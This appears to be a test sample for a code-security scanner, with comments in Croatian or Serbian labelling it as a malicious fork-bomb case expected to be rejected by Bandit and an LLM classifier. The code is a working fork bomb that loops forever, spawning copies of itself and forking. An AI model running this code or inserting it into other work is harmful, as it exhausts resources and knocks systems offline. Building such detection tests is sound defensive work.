# Maliciozni test 5: Fork bomb / resource exhaustion
# Očekivano: REJECTED (Bandit B603, LLM: MALICIOUS)

import os
import subprocess

while True:
    subprocess.Popen(["python3", __file__])
    os.fork()
